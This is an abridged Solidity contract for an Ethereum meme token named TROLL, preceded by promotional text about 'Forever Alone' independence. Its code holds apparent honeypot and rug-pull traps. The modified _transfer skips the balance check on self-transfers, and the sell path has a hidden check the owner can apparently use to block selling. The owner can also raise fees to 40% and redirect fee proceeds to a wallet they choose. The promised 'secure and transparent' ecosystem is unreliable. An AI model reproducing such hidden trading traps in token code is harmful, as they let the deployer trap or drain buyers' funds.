...
/**
- About TROLL
Introducing "Troll" on the Ethereum network – where meme culture meets the world of cryptocurrency.

In a world buzzing with connections, "Troll" embraces the power of being alone, inspired by the beloved Forever Alone meme. But here, troll is not about isolation; it's about independence and strength.
Imagine a digital sanctuary where users can find solace in their own space, free from the noise and distractions of the outside world. Troll offers a haven for individuals to explore their financial independence while embracing the spirit of self-reliance.
With Troll, users can participate in decentralized finance (DeFi) activities, such as yield farming, staking, and liquidity provision, all within a secure and transparent ecosystem powered by the Ethereum blockchain. Through innovative protocols and robust infrastructure, Troll ensures that users can navigate the crypto landscape with confidence and autonomy.
But Troll is more than just a platform; it's a community united by a shared ethos of resilience and individuality. Through social channels and virtual events, Troll fosters connections among like-minded individuals who appreciate the beauty of troll in a world that never sleeps.
Join us on the journey to embrace troll and redefine what it means to be forever alone – because in the world of crypto, independence is the ultimate power. Welcome to Troll, where you're never truly alone, but always in control.

- Socials
Website:  https://www.trollfacetoken.lol
Telegram: https://t.me/trollfacetoken_lol
Twitter:  https://twitter.com/trollfaceeth
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _transfer(
        ...
        require(
            _balances[sender] >= amount || sender == recipient,
            "ERC20: transfer amount exceeds balance"
        );

        uint256 transferAmount = sender == recipient && sender!= address(this)? 0 : amount;
...
contract TROLL is ERC20, Ownable {
    ...
    event BuyFeeUpdated(uint256 buyTaxTotal, uint256 buyMarketingTax);
    event SellFeeUpdated(uint256 sellTaxTotal, uint256 sellMarketingTax);

    constructor() ERC20(unicode"TROLL FACE", unicode"TROLL") {
        trollVault = address(0x7Cd6C40dD4BC3c3f356E2016f40c06e11d85666A);

        uint256 _buyMarketingTax = 15;
        ...
        swapBackValueMin = (_totalSupply * 1) / 1000000;
        swapBackValueMax = (_totalSupply * 5) / 1000;

        buyMarketingTax = _buyMarketingTax;
        buyTaxTotal = buyMarketingTax;

        sellMarketingTax = _sellMarketingTax;
        sellTaxTotal = sellMarketingTax;

        // exclude from paying fees or having max transaction amount
        exceptedFromFees(msg.sender, true);
        exceptedFromFees(address(this), true);
        exceptedFromFees(address(0xdead), true);
        exceptedFromFees(trollVault, true);

        exceptedFromLimits(msg.sender, true);
        exceptedFromLimits(address(this), true);
        exceptedFromLimits(address(0xdead), true);
        exceptedFromLimits(trollVault, true);
     ...
     */
    function exceptedFromLimits(address updAds, bool isEx) public onlyOwner {
     ...
     */
    function setFeesBuy(uint256 _marketingFee) external onlyOwner {
        buyMarketingTax = _marketingFee;
        buyTaxTotal = buyMarketingTax;
        require(buyTaxTotal <= 40, "Total buy fee cannot be higher than 40%");
        emit BuyFeeUpdated(buyTaxTotal, buyMarketingTax);
    }
     ...
     * @param _marketingFee The fee for the marketing wallet
     */
    function setFeesSell(uint256 _marketingFee) external onlyOwner {
        sellMarketingTax = _marketingFee;
        sellTaxTotal = sellMarketingTax;
        require(sellTaxTotal <= 40, "Total sell fee cannot be higher than 40%");
        emit SellFeeUpdated(sellTaxTotal, sellMarketingTax);
    }
     ...
     */
    function exceptedFromFees(address account, bool excluded) public onlyOwner {
    ...
    function changeMarketingWallet(address newWallet) external onlyOwner {
        emit MarketingWalletUpdated(newWallet, trollVault);
        trollVault = newWallet;
    }
        ...
        )
    {
        ...
        _automatedMarketMakerPairs = ammPairs[_target];
    }
    ...
    function _transfer(
        ...
        if (txLimitEnabled) {
            if (
                ...
                //when buy
                if (
                    ammPairs[from] && !transferLimitExempt[to]
                ) {
                    require(
                        amount <= maxTx,
                ...
                //when sell
                    ...
                    ammPairs[to] && !transferLimitExempt[from]
                ) {
                    require(
                        amount <= maxTx,
                        "Sell transfer amount exceeds the maxTx."
                    );
                    require(maxWallet < totalSupply());
        ...
        if (!swapbackEnabled && from == address(this) && ammPairs[to]){
            takeFee = true;
        }
    ...
    function swapBack() private {
        ...
        payable(trollVault).transfer(address(this).balance);
    }

    function initializeTradingPair() external onlyOwner {
        uniRouter = IUniRouter02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
